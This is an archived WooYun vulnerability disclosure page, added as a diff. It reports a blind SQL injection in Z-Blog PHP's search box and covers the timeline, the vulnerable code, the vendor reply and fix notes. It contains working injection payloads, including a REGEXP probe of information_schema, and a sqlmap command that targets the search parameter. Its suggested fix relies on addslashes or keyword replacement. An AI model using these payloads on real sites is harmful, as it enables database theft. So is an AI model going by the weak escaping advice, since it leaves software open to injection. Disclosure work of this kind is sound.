@@ -1,0 +1,237 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Z-Blog的php版前台正则SQL盲注漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Z-Blog的php版前台正则SQL盲注漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/只发通用型">只发通用型</a> 
+</li><li>提交时间：		2013-09-24 12:02</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-27：	细节向第三方安全合作伙伴开放<br/>
+									2013-10-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-14：	细节向普通白帽子公开<br/>
+									2013-11-03：	细节向实习白帽子公开<br/>
+									2013-12-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">第二发...另外有点疑惑想问下你们的开发</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题出在<br />
+<br />
+/zb_system/function/c_system_common.php<br />
+<br />
+</p><pre><code>function GetVars($name,$type=&#039;REQUEST&#039;){<br />
+	if ($type==&#039;ENV&#039;) {$array=&amp;$_ENV;}<br />
+	if ($type==&#039;GET&#039;) {$array=&amp;$_GET;}<br />
+	if ($type==&#039;POST&#039;) {$array=&amp;$_POST;}<br />
+	if ($type==&#039;COOKIE&#039;) {$array=&amp;$_COOKIE;}<br />
+	if ($type==&#039;REQUEST&#039;) {$array=&amp;$_REQUEST;}<br />
+	if ($type==&#039;SERVER&#039;) {$array=&amp;$_SERVER;}<br />
+	if ($type==&#039;SESSION&#039;) {$array=&amp;$_SESSION;}<br />
+	if ($type==&#039;FILES&#039;) {$array=&amp;$_FILES;}<br />
+<br />
+	if(isset($array[$name])){<br />
+		var_dump($array[$name]);<br />
+		return $array[$name];<br />
+	}else{<br />
+		return null;<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+GET过来的数据木有经过过滤就进入dbsql.php里面查询<br />
+<br />
+在前台的搜索框里输入注入语句,h为可搜索到的字符<br />
+<br />
+ h%&#039;)  and 1)#<br />
+<br />
+</p><p class="detail"><a href="../images/24114346b4796e74569456ade3719137ec351b74.jpg" target="_blank"><img src="../images/24114346b4796e74569456ade3719137ec351b74.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+and 1可以替换成SQL注入，这里使用正则盲注<br />
+<br />
+h%&#039;)and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;zblog&quot; AND table_name REGEXP &#039;^[a-z]&#039; LIMIT 0,1))#<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241148287790c815773c56bfc9fd175507dd6fdc.jpg" target="_blank"><img src="../images/241148287790c815773c56bfc9fd175507dd6fdc.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+一个个字符把数据读出来..<br />
+<br />
+手注太蛋疼 使用sqlmap <br />
+<br />
+</p><pre><code>python sqlmap.py -u 网站地址/search.php?q=能成功搜索到的字符 -p 能成功搜索到的字符 --prefix &quot;%&#039;)&quot; --suffix &quot;)#&quot;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/241156400e212453811287b9ad15fd52607999db.jpg" target="_blank"><img src="../images/241156400e212453811287b9ad15fd52607999db.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2411540670e9c9bd342f6d2f8e67bebc4547fc9e.jpg" target="_blank"><img src="../images/2411540670e9c9bd342f6d2f8e67bebc4547fc9e.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我想弱弱问一句 为啥要把\&#039;转换回来.求注入的节奏？<br />
+<br />
+zblog/zb_system/function/c_system_base.php<br />
+<br />
+</p><pre><code>function _stripslashes(&amp;$val) {<br />
+	if(!is_array($val)) return stripslashes($val);<br />
+	foreach($val as $k =&gt; &amp;$v) $val[$k] = _stripslashes($v);<br />
+	return $val;<br />
+}<br />
+<br />
+if(get_magic_quotes_gpc()){<br />
+	_stripslashes($_GET);<br />
+	_stripslashes($_POST);<br />
+	_stripslashes($_COOKIE);<br />
+}</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/241156400e212453811287b9ad15fd52607999db.jpg" target="_blank"><img src="../images/241156400e212453811287b9ad15fd52607999db.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/2411540670e9c9bd342f6d2f8e67bebc4547fc9e.jpg" target="_blank"><img src="../images/2411540670e9c9bd342f6d2f8e67bebc4547fc9e.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">使用mysql_real_escape_string()或addslashes()对传入参数进行过滤，或者使用str_replace()对一些关键词进行替换。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/只发通用型" title="只发通用型">只发通用型</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-037956" title="Z-Blog的php版前台正则SQL盲注漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-09-24 13:41</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢。把\&#039;转换回来是因为dbsql有addslashes()处理，可能dbsql没处理好。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-09-24：找到原因了，dbsql第197行是多余的，所以引起了所有的BUG；</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="37956";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
